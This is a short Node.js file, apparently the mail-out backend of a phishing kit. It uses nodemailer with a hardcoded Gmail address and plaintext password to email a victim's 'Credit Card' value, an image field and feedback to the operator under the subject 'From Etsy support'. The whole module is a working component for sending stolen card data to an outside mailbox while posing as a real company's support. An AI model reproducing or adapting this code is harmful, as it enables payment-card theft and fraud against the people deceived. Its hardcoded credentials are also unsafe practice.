'use strict';

const nodemailer = require('nodemailer');
const path = require('path');
const ABSPATH = path.dirname(process.mainModule.filename); // Absolute path to our app directory
const transporter = nodemailer.createTransport({ // Use an app specific password here
  service: 'Gmail',
  auth: {
    user: 'hayanisaid1995@gmail.com',
    pass: 'said.www.com'
  }
});

exports.sendMailService=function(cardC='not exit',opinion='no Feedback',image='no file'){
	const options = {
    from: 'hayanisaid1995@gmail.com',
    to: 'hayanisaid1995@gmail.com',
    subject: 'From Etsy support',
    html: `<ul>
     <li>Credit Card: ${cardC}</li>
     <li>${image}</li>
      <li>Opinin:${opinion}</li> 

     </li>`
    // attachments: [
    //    {
    //     path: ABSPATH + '/images/test.jpg'
    //    }
    // ]
};
transporter.sendMail(options, (error, info) =>{
    if(error) {
       console.log('error')
    } else {
      console.log('hi')
    }
});

};

//module.exports=sendMailService












